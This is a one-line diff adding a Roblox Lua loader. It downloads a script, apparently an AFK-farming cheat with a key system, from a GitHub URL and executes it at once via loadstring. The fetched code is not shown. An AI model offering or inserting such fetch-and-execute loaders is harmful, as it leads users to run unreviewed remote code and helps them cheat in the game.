@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MinionRoblox/KeySystem-AFK-For-UGC/main/Keygame.lua"))()
